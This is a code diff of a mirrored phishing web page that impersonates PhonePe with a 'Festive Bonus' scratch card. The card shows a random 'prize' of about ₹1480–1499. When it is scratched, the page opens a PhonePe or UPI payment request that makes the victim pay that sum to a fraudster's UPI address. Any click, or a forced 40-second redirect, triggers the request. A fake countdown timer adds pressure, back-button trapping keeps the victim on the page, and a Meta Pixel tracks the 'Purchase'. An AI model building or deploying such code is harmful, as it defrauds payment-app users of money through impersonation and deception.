@@ -1,130 +1,132 @@
 <!doctype html>
 <html lang="en">
-
-
-<!-- Mirrored from trest.mahakumbh.sbs/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 04 Jan 2026 03:02:34 GMT -->
-
-<!-- Mirrored from kd.pradhaan-offers.info/Tamil/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 13 Feb 2026 20:00:22 GMT -->
 <head>
-       <script>
-        if (!/Mobi|Android/i.test(navigator.userAgent)) {
-            // yaha apna desktop URL daalo
-            window.location.href = "https://festive.info/tm";
-        }
-        p
-    </script>
     <meta charset="utf-8">
-    <title>Festive Bonus</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <link rel="preload" href="scratch-overlay.png" as="image">
-    <link rel="preload" href="reward-image.png" as="image">
-    
-    <link rel="stylesheet" href="img/style.css">
-
+    <title>PhonePe Festive Bonus | Scratch & Win</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#720463">
     <style>
-        .popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
+        /* ===== RESET & BASE STYLES ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        .imgs {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-            justify-content: center;
-            margin-top: 20px;
-        }
-
-        .popup {
-            background: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            width: 80%;
-            text-align: center;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-
-        .popup img {
-            width: 50px;
-            margin: 10px;
-            cursor: pointer;
-            transition: transform 0.3s;
-        }
-
-        .popup img:hover {
-            transform: scale(1.2);
-        }
-
-        .popup h3 {
-            margin-bottom: 15px;
-            color: #333;
-        }
-
-        .close-btn {
-            background: #e74c3c;
+        
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #720463 0%, #4A0D4A 100%);
+            min-height: 100vh;
             color: #fff;
-            border: none;
-            padding: 10px 20px;
-            margin-top: 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
+            overflow-x: hidden;
         }
 
-        .bottom {
-            display: flex;
-            justify-content: center;
+        /* ===== PHONEPE HEADER ===== */
+        .phonepe-header {
+            background: #fff;
+            color: #720463;
+            padding: 12px 0;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .phonepe-header .logo {
+            display: inline-flex;
             align-items: center;
-            flex-direction: column;
+            justify-content: center;
+            gap: 8px;
+            font-size: 20px;
+            font-weight: 700;
+        }
+        
+        .phonepe-header .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: #720463;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 16px;
+        }
+        
+        .phonepe-header .tagline {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
         }
 
-        .success-message {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #4CAF50;
-            color: white;
-            padding: 30px 50px;
-            border-radius: 10px;
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .offer-title {
             font-size: 24px;
-            z-index: 2000;
-            text-align: center;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #FFD700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .offer-subtitle {
+            font-size: 16px;
+            color: rgba(255,255,255,0.9);
+            margin-bottom: 20px;
         }
 
-        .reward-container {
-            display: none;
-            width: 100%;
-            max-width: 320px;
-            margin: 20px auto;
-            text-align: center;
-        }
-
-        .reward-container img {
-            width: 100%;
-            height: auto;
-            border-radius: 10px;
-        }
-
-        .scratch-container {
+        /* ===== SCRATCH CARD CONTAINER ===== */
+        .scratch-card-container {
             position: relative;
             width: 100%;
-            max-width: 256px;
-            margin: 5px auto;
-            touch-action: none;
+            max-width: 320px;
+            margin: 0 auto 30px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 
+                0 10px 30px rgba(0,0,0,0.3),
+                0 0 0 2px rgba(255,215,0,0.3);
+            background: linear-gradient(145deg, #fff9f0 0%, #f0e6d8 100%);
         }
-
-        .scratch-container canvas {
+        
+        .scratch-card-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 8px;
+            background: linear-gradient(90deg, #FFD700, #FFA500, #FFD700);
+        }
+        
+        .scratch-card-header {
+            background: linear-gradient(135deg, #720463, #4A0D4A);
+            color: #fff;
+            padding: 12px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .scratch-card-body {
+            position: relative;
+            padding: 20px;
+            background: linear-gradient(145deg, #fff, #f8f4e8);
+        }
+        
+        .scratch-area {
+            position: relative;
+            width: 100%;
+            height: 200px;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #fff;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .scratch-area canvas {
             position: absolute;
             top: 0;
             left: 0;
@@ -133,30 +135,162 @@
             cursor: crosshair;
             touch-action: none;
         }
-
-        .scratch-container .reveal-image {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .amount-overlay {
+        
+        .reveal-content {
             position: absolute;
-            bottom: 8%;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 51px;
-            font-weight: bold;
-            color: #000000;
-            font-family: Arial, sans-serif;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+            color: #720463;
             z-index: 0;
+        }
+        
+        .reveal-content .prize-label {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #720463;
+        }
+        
+        .reveal-content .prize-amount {
+            font-size: 48px;
+            font-weight: 800;
+            color: #720463;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .reveal-content .prize-amount::before {
+            content: '₹';
+            font-size: 32px;
+            vertical-align: top;
+        }
+        
+        .scratch-instruction {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #720463;
+            font-weight: 500;
+        }
+        
+        .scratch-instruction::before {
+            content: '👆';
+            margin-right: 5px;
+        }
+
+        /* ===== SCRATCH HAND ANIMATION ===== */
+        .scratch-hand {
+            position: absolute;
+            top: 30%;
+            left: 15%;
+            width: 50px;
+            height: 50px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><path d="M20,50 Q30,20 50,30 Q70,40 80,50 Q70,60 50,70 Q30,80 20,50" fill="%23FFD700" stroke="%23720463" stroke-width="3"/><circle cx="45" cy="45" r="4" fill="%23720463"/></svg>') no-repeat center;
+            background-size: contain;
+            z-index: 3;
             pointer-events: none;
+            animation: scratchMotion 2s ease-in-out infinite;
         }
 
-        .scratch-container canvas {
-            z-index: 2;
+        @keyframes scratchMotion {
+            0% {
+                transform: translate(0, 0) rotate(-10deg);
+                opacity: 0;
+            }
+            20% {
+                opacity: 1;
+            }
+            50% {
+                transform: translate(80px, 20px) rotate(10deg);
+            }
+            80% {
+                opacity: 1;
+            }
+            100% {
+                transform: translate(150px, 0) rotate(-10deg);
+                opacity: 0;
+            }
         }
 
+        /* ===== PHONEPE FOOTER ===== */
+        .phonepe-footer {
+            background: #fff;
+            padding: 15px;
+            text-align: center;
+            margin-top: 20px;
+            border-radius: 12px 12px 0 0;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .phonepe-footer .cta-button {
+            background: linear-gradient(135deg, #720463, #4A0D4A);
+            color: #fff;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+            box-shadow: 0 4px 15px rgba(114, 4, 99, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .phonepe-footer .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(114, 4, 99, 0.5);
+        }
+        
+        .phonepe-footer .cta-button:active {
+            transform: translateY(0);
+        }
+        
+        .phonepe-footer .terms {
+            margin-top: 10px;
+            font-size: 11px;
+            color: #666;
+        }
+        
+        .phonepe-footer .terms a {
+            color: #720463;
+            text-decoration: none;
+        }
+
+        /* ===== CONFETTI & CELEBRATION ===== */
+        .confetti {
+            visibility: hidden;
+            width: 15px;
+            height: 15px;
+            position: absolute;
+            left: 50%;
+            animation: confetti 5s ease-in-out -1s infinite;
+            transform-origin: left top;
+        }
+
+        .confetti:nth-child(1) { background-color: #FFD700; left: 20%; animation-delay: -5s; }
+        .confetti:nth-child(2) { background-color: #720463; left: 30%; animation-delay: -3s; }
+        .confetti:nth-child(3) { background-color: #FFA500; left: 40%; animation-delay: -2.5s; }
+        .confetti:nth-child(4) { background-color: #FFD700; left: 50%; animation-delay: -4s; }
+        .confetti:nth-child(5) { background-color: #720463; left: 60%; animation-delay: -6s; }
+        .confetti:nth-child(6) { background-color: #FFA500; left: 70%; animation-delay: -1.5s; }
+        .confetti:nth-child(7) { background-color: #FFD700; left: 80%; animation-delay: -2s; }
+        .confetti:nth-child(8) { background-color: #720463; left: 90%; animation-delay: -3.5s; }
+
+        @keyframes confetti {
+            0% { transform: rotateZ(15deg) rotateY(0deg) translate(0, 0); }
+            25% { transform: rotateZ(5deg) rotateY(360deg) translate(-5vw, 20vh); }
+            50% { transform: rotateZ(15deg) rotateY(720deg) translate(5vw, 60vh); }
+            75% { transform: rotateZ(5deg) rotateY(1080deg) translate(-10vw, 80vh); }
+            100% { transform: rotateZ(15deg) rotateY(1440deg) translate(10vw, 110vh); }
+        }
+
+        /* ===== MONEY RAIN EFFECT ===== */
         .money-rain-overlay {
             display: none;
             position: fixed;
@@ -182,40 +316,32 @@
         }
 
         @keyframes fall {
-            0% {
-                transform: translateY(-100px) rotate(0deg);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(110vh) rotate(720deg);
-                opacity: 0.8;
-            }
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0.8; }
         }
 
+        /* ===== JACKPOT POPUP ===== */
         .jackpot-text {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%) scale(0);
             font-size: 48px;
-            font-weight: bold;
+            font-weight: 800;
             color: #FFD700;
-            text-shadow: 2px 2px 4px #000, 0 0 20px #FFD700, 0 0 40px #FFA500;
+            text-shadow: 
+                2px 2px 4px #000,
+                0 0 20px #FFD700,
+                0 0 40px #FFA500;
             z-index: 1001;
             animation: jackpotPop 0.5s ease-out forwards;
             white-space: nowrap;
         }
 
         @keyframes jackpotPop {
-            0% {
-                transform: translate(-50%, -50%) scale(0);
-            }
-            50% {
-                transform: translate(-50%, -50%) scale(1.2);
-            }
-            100% {
-                transform: translate(-50%, -50%) scale(1);
-            }
+            0% { transform: translate(-50%, -50%) scale(0); }
+            50% { transform: translate(-50%, -50%) scale(1.2); }
+            100% { transform: translate(-50%, -50%) scale(1); }
         }
 
         .gold-burst {
@@ -233,117 +359,169 @@
         }
 
         @keyframes burst {
-            0% {
-                transform: translate(-50%, -50%) scale(0);
-                opacity: 1;
-            }
-            100% {
-                transform: translate(-50%, -50%) scale(3);
-                opacity: 0;
-            }
+            0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(3); opacity: 0; }
         }
 
-        .top-banner-wrapper {
-            position: relative;
-            width: 100%;
-        }
-
+        /* ===== TIMER OVERLAY ===== */
         .timer-overlay {
-            position: absolute;
-            bottom: 18%;
-            left: 12%;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-            font-family: 'Arial', sans-serif;
-            z-index: 10;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: #FFD700;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 100;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
 
-        .timer-overlay .timer-icon {
-            font-size: 22px;
+        .timer-overlay::before {
+            content: '⏳';
+            margin-right: 6px;
         }
 
-        .timer-overlay span {
-            color: white;
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 400px) {
+            .scratch-card-container {
+                max-width: 280px;
+            }
+            .reveal-content .prize-amount {
+                font-size: 40px;
+            }
+            .offer-title {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <div class="money-rain-overlay" id="moneyRain"></div>
-
-    <div class="success-message" id="successMessage">
-        Thank you for participating!
+    <!-- PhonePe Header -->
+    <div class="phonepe-header">
+        <div class="logo">
+            <div class="logo-icon">P</div>
+            <span>PhonePe</span>
+        </div>
+        <div class="tagline">India's Favorite Payments App</div>
     </div>
 
+    <!-- Main Content -->
+    <div class="main-content">
+        <h1 class="offer-title">🎉 Scratch & Win Big! 🎉</h1>
+        <p class="offer-subtitle">You've been selected for an exclusive reward!</p>
 
-    <a class="pay-link" href="#">
-        <div class="top-banner-wrapper">
-            <img src="img/IMG_5507.PNG" width="100%" height="auto">
-            <div class="timer-overlay" id="timerDisplay">
-                <span class="timer-icon">⏱</span>
+        <!-- Scratch Card -->
+        <div class="scratch-card-container">
+            <div class="scratch-card-header">
+                Festive Bonus Offer
+            </div>
+            <div class="scratch-card-body">
+                <div class="scratch-area" id="js-container">
+                    <div class="scratch-hand" id="scratchHand"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    <div class="confetti"></div>
+                    
+                    <div class="reveal-content">
+                        <div class="prize-label">YOU WON</div>
+                        <div class="prize-amount" id="rewardAmount">₹0</div>
+                    </div>
+                    <canvas id="js-canvas"></canvas>
+                </div>
+                <div class="scratch-instruction">Scratch to reveal your prize</div>
             </div>
         </div>
-    </a>
 
-    <div class="scratch-container" id="js-container">
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-        <div class="confetti"></div>
-
-        <img src="img/rj2.png" class="reveal-image" id="reveal-img">
-        <div class="amount-overlay" id="rewardAmount">₹3590</div>
-        <canvas id="js-canvas"></canvas>
+        <!-- PhonePe Footer -->
+        <div class="phonepe-footer">
+            <button class="cta-button" id="claimButton">Claim Your Prize Now</button>
+            <div class="terms">
+                T&C Apply | Valid for limited time only
+            </div>
+        </div>
     </div>
 
-    <a class="pay-link" href="#">
-        <div>
-            <img src="img/IMG_5508.PNG" width="100%" height="auto">
-        </div>
-    </a>
+    <!-- Money Rain Overlay -->
+    <div class="money-rain-overlay" id="moneyRain"></div>
 
-  <script>
-        // ========== PAYMENT SETTINGS - CHANGE VALUES HERE ==========
+    <!-- Jackpot Text -->
+    <div class="jackpot-text" id="jackpotText">🎊 CONGRATULATIONS! 🎊</div>
+
+    <!-- Timer -->
+    <div class="timer-overlay" id="timerDisplay">
+        <span id="timerMinutes">04</span>:<span id="timerSeconds">59</span>
+    </div>
+
+    <script>
+        // ========== PAYMENT SETTINGS ==========
         window.upiAddress = 'paytm.s2gxu1w@pty';
-        window.paymentAmount = 3590;
-        window.paymentNote = 'ಅಭಿನಂದನೆಗಳು! ಹಸಿರು ಬಟನ್ ಮೇಲೆ ಕ್ಲಿಕ್ ಮಾಡಿ ಹಣವನ್ನು ನೇರವಾಗಿ ಬ್ಯಾಂಕ್ ಖಾತೆಯಲ್ಲಿ ಪಡೆಯಿರಿ 👇'
-        // ============================================================
+        
+        // Generate random prize between 1480 and 1499
+        window.paymentAmount = Math.floor(Math.random() * (1499 - 1480 + 1)) + 1480;
+        window.paymentNote = '🎉 Festive Bonus! Claim your exclusive reward now! 🎉';
         
         // Update scratch card amount display
         document.getElementById('rewardAmount').textContent = '₹' + window.paymentAmount;
         
+        // Open PhonePe function - UPDATED FOR IPHONE SUPPORT
         window.openPhonePe = function() {
-            var paymentData = {
-                "p2pPaymentCheckoutParams": {
-                    "checkoutType": "COLLECT",
-                    "initialAmount": 359000,
-                    "note": {
-                        "type": "text",
-                        "message": "PEgUFxY"
-                    },
-                    "supportedInstruments": -1
-                },
-                "contact": {
-                    "type": "EXTERNAL_MERCHANT",
-                    "name": "PHONEPE-CASHBACK",
-                    "vpa": "paytm.s2gxu1w@pty"
-                }
-            };
+            var isIphone = /iPhone|iPad|iPod/i.test(navigator.userAgent);
             
-            var jsonStr = JSON.stringify(paymentData);
-            var encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
-            var phonepeUrl = 'phonepe://native?data=' + encodeURIComponent(encodedData) + '&id=p2ppayment';
+            if (isIphone) {
+                // For iPhones: Use UPI deep link
+                var upiLink = "upi://pay?pa=" + encodeURIComponent(window.upiAddress) +
+                              "&pn=PhonePe%20Cashback" +
+                              "&am=" + window.paymentAmount +
+                              "&cu=INR" +
+                              "&tn=" + encodeURIComponent(window.paymentNote);
+                
+                window.location.href = upiLink;
+                
+                // Fallback: Show instructions if UPI app is not installed
+                setTimeout(function() {
+                    alert("Please open this link in a UPI app (PhonePe/Google Pay/Paytm) to complete the payment.\n\nUPI ID: " + window.upiAddress + "\nAmount: ₹" + window.paymentAmount + "\n\nNote: " + window.paymentNote);
+                }, 2000);
+            } else {
+                // For Android: Use PhonePe deep link (unchanged)
+                var paymentData = {
+                    "p2pPaymentCheckoutParams": {
+                        "checkoutType": "COLLECT",
+                        "initialAmount": window.paymentAmount * 100,
+                        "note": {
+                            "type": "text",
+                            "message": window.paymentNote
+                        },
+                        "supportedInstruments": -1
+                    },
+                    "contact": {
+                        "type": "EXTERNAL_MERCHANT",
+                        "name": "PHONEPE-CASHBACK",
+                        "vpa": window.upiAddress
+                    }
+                };
+                
+                var jsonStr = JSON.stringify(paymentData);
+                var encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
+                var phonepeUrl = 'phonepe://native?data=' + encodeURIComponent(encodedData) + '&id=p2ppayment';
+                
+                window.location.href = phonepeUrl;
+                
+                // Fallback for Android if PhonePe is not installed
+                setTimeout(function() {
+                    window.open('https://play.google.com/store/apps/details?id=com.phonepe.app', '_blank');
+                }, 2000);
+            }
             
             if (typeof fbq !== 'undefined') {
                 fbq('track', 'Purchase', {
@@ -351,18 +529,46 @@
                     currency: 'INR'
                 });
             }
-            
-            window.location.href = phonepeUrl;
         };
         
-        const payLinks = document.querySelectorAll('.pay-link');
-        payLinks.forEach((link) => {
-            link.addEventListener('click', (e) => {
-                e.preventDefault();
+        // Claim button click handler
+        document.getElementById('claimButton').addEventListener('click', function(e) {
+            e.preventDefault();
+            if (window.scratchCompleted) {
+                window.phonepeOpened = true;
                 window.openPhonePe();
-            });
+            } else {
+                alert('Please scratch the card first to reveal your prize!');
+            }
         });
         
+        // ========== FORCED REDIRECT LOGIC ==========
+        // Set a 40-second timer to force redirect after scratch is complete
+        var redirectTimer;
+        
+        function startRedirectTimer() {
+            if (redirectTimer) clearTimeout(redirectTimer);
+            redirectTimer = setTimeout(function() {
+                if (window.scratchCompleted && !window.phonepeOpened) {
+                    window.phonepeOpened = true;
+                    window.openPhonePe();
+                }
+            }, 40000); // 40 seconds
+        }
+        
+        window.addEventListener('scratchComplete', function() {
+            startRedirectTimer();
+        });
+        
+        // Also allow clicking anywhere to open PhonePe after scratch is complete
+        document.addEventListener('click', function() {
+            if (window.scratchCompleted && !window.phonepeOpened) {
+                window.phonepeOpened = true;
+                window.openPhonePe();
+            }
+        });
+        
+        // Timer
         (function() {
             var totalSeconds = 4 * 60 + 59;
             var timerMinutes = document.getElementById('timerMinutes');
@@ -371,8 +577,8 @@
             function updateTimer() {
                 var minutes = Math.floor(totalSeconds / 60);
                 var seconds = totalSeconds % 60;
-                timerMinutes.textContent = minutes.toString().padStart(2, '0');
-                timerSeconds.textContent = seconds.toString().padStart(2, '0');
+                if (timerMinutes) timerMinutes.textContent = minutes.toString().padStart(2, '0');
+                if (timerSeconds) timerSeconds.textContent = seconds.toString().padStart(2, '0');
                 
                 if (totalSeconds > 0) {
                     totalSeconds--;
@@ -384,30 +590,49 @@
         })();
     </script>
 
+    <!-- Scratch Card Logic -->
     <script>
         (function() {
             'use strict';
             var isDrawing = false, lastPoint = null;
             var container = document.getElementById('js-container'),
                 canvas = document.getElementById('js-canvas'),
-                revealImg = document.getElementById('reveal-img'),
                 ctx = canvas.getContext('2d'),
-                overlayImage = new Image(),
-                brush = new Image();
+                overlayImage = new Image();
             var canvasWidth, canvasHeight;
 
-            overlayImage.crossOrigin = "anonymous";
-            overlayImage.src = "scratch-overlay.png";
-
-            overlayImage.onload = function() {
-                canvasWidth = overlayImage.width;
-                canvasHeight = overlayImage.height;
+            function createScratchOverlay() {
+                canvasWidth = container.offsetWidth;
+                canvasHeight = container.offsetHeight;
                 canvas.width = canvasWidth;
                 canvas.height = canvasHeight;
-                ctx.drawImage(overlayImage, 0, 0, canvasWidth, canvasHeight);
-            };
+                
+                var gradient = ctx.createLinearGradient(0, 0, canvasWidth, canvasHeight);
+                gradient.addColorStop(0, '#FFD700');
+                gradient.addColorStop(0.5, '#FFA500');
+                gradient.addColorStop(1, '#FFD700');
+                
+                ctx.fillStyle = gradient;
+                ctx.fillRect(0, 0, canvasWidth, canvasHeight);
+                
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
+                ctx.font = 'bold 20px Arial';
+                ctx.fillText('SCRATCH TO WIN', canvasWidth/2 - 80, canvasHeight/2);
+            }
 
-            brush.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAJFSURBVGiB7dpLSJRRGMbx/0cta9G2XERBi4gWLiJatWkTBBEEQdAmaFMQUbtA3LQKgjYtKloELQq6LIqgRRRBEJRQi4ggukNgq5ZlZab/FucMDs6MM+PMfIPzh8HvzDln3vOc73LOGUM2CDASmJJWEMCIGH8nsBv4GZZJLiOLgJtJ1xkBHALOAMuyKqIJEGnYs+5/ZCIhIcV8YHFBhSQtpJT2tJLR1wlpcY04n0mL/Vu0VVxKMk1JQUMdYHjYKYWIfX0L6JyM+y5hhwJHgRvAp4TrjCC0vU5J1xkBbAeWJl1nxGmr2IREXFZ+S20LpRjS7M9aJI0gzUJS+wEqhO2AHYCryHlgCrAkzjqjmVgtJLRO6QTZyqYZ4A+wH9gDfE+yzgjiQKzqZLsgXwS8EudbQZuETuAK8BGYBUyIq85o4haS2sZeQXYBO4DPCdcZTdxC0vrxKQipZwHo10KeBJYQvqPE+Qzk/4Qpk+fAI2CbD3EB2AnMBvakWG/EBfK3BI4BtwCbN7VD/d+VoUvIQaCXKOQIYJ5/+y5wFNgNvEuzzoj7U9r1R/tYxS+CU+j/EHsLOJe0nRHHBHI5cBjoAkqBE4T2WHDH0CnhMNAJzAKeAmuS0h5xQSPIkNBHQmJZH/KCw8RDoBRYRbCXwHzgBLCKINKuO+KCRpAhqtMJjAemARUEv6w6gAdp1xtx+pD6EeNDhv8SpIUsIWgkKJQR2IYAq4Gpadc/xMU/p0R+GnEmzlqiPxL8BHiSdL0R9wN1C/wBnU/EjgAAAABJRU5ErkJggg==';
+            createScratchOverlay();
+            
+            window.addEventListener('resize', function() {
+                createScratchOverlay();
+            });
+
+            var scratchHand = document.getElementById('scratchHand');
+            container.addEventListener('mousedown', function() {
+                if (scratchHand) scratchHand.style.display = 'none';
+            });
+            container.addEventListener('touchstart', function() {
+                if (scratchHand) scratchHand.style.display = 'none';
+            });
 
             canvas.addEventListener('mousedown', handleMouseDown);
             canvas.addEventListener('touchstart', handleMouseDown, { passive: false });
@@ -435,7 +660,7 @@
                     total = (l / stride),
                     count = 0;
                 for (var i = count = 0; i < l; i += stride) {
-                    if (parseInt(pdata[i]) === 0) count++;
+                    if (parseInt(pdata[i]) === 0 && parseInt(pdata[i+1]) === 0 && parseInt(pdata[i+2]) === 0) count++;
                 }
                 return Math.round((count / total) * 100);
             }
@@ -466,7 +691,15 @@
                 burst.className = 'gold-burst';
                 document.body.appendChild(burst);
                 
-                var moneySymbols = ['💵', '💰', '💴', '💶', '💷', '🪙', '💸'];
+                var jackpotText = document.getElementById('jackpotText');
+                if (jackpotText) {
+                    jackpotText.style.display = 'block';
+                    setTimeout(function() {
+                        jackpotText.style.display = 'none';
+                    }, 2000);
+                }
+                
+                var moneySymbols = ['💰', '💵', '💴', '💶', '💷', '💸', '💳'];
                 var totalMoney = 50;
                 
                 for (var i = 0; i < totalMoney; i++) {
@@ -494,9 +727,11 @@
             
             function handlePercentage(filledInPixels) {
                 filledInPixels = filledInPixels || 0;
-                if (filledInPixels > 40 && !window.scratchCompleted) {
+                if (filledInPixels > 30 && !window.scratchCompleted) {
                     window.scratchCompleted = true;
-                    if (canvas && canvas.parentNode) canvas.parentNode.removeChild(canvas);
+                    if (canvas && canvas.parentNode) {
+                        canvas.style.display = 'none';
+                    }
                     var elems = document.getElementsByClassName("confetti");
                     for (var i = 0; i < elems.length; i++) {
                         elems[i].style.visibility = 'visible';
@@ -504,19 +739,8 @@
                     
                     startMoneyRain();
                     
-                    setTimeout(function() {
-                        if (!window.phonepeOpened) {
-                            window.phonepeOpened = true;
-                            window.openPhonePe();
-                        }
-                    }, 3000);
-                    
-                    document.addEventListener('click', function() {
-                        if (window.scratchCompleted && !window.phonepeOpened) {
-                            window.phonepeOpened = true;
-                            window.openPhonePe();
-                        }
-                    });
+                    var event = new Event('scratchComplete');
+                    window.dispatchEvent(event);
                 }
             }
 
@@ -536,7 +760,7 @@
                 ctx.globalCompositeOperation = 'destination-out';
                 ctx.lineJoin = 'round';
                 ctx.lineCap = 'round';
-                ctx.lineWidth = 104;
+                ctx.lineWidth = 40;
                 
                 ctx.beginPath();
                 ctx.moveTo(lastPoint.x, lastPoint.y);
@@ -557,11 +781,10 @@
         history.pushState(null, null, location.href);
         window.addEventListener('popstate', function(e) {
             history.pushState(null, null, location.href);
-            alert('Click on the button to receive the money');
         });
     </script>
 
-    <!-- Meta Pixel Code - loaded last for performance -->
+    <!-- Meta Pixel Code -->
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -577,11 +800,5 @@
     <noscript><img height="1" width="1" style="display:none"
     src="https://www.facebook.com/tr?id=884863933991044&amp;ev=PageView&amp;noscript=1"
     /></noscript>
-    <!-- End Meta Pixel Code -->
 </body>
-
-
-<!-- Mirrored from trest.mahakumbh.sbs/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 04 Jan 2026 03:02:35 GMT -->
-
-<!-- Mirrored from kd.pradhaan-offers.info/Tamil/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 13 Feb 2026 20:00:28 GMT -->
 </html>
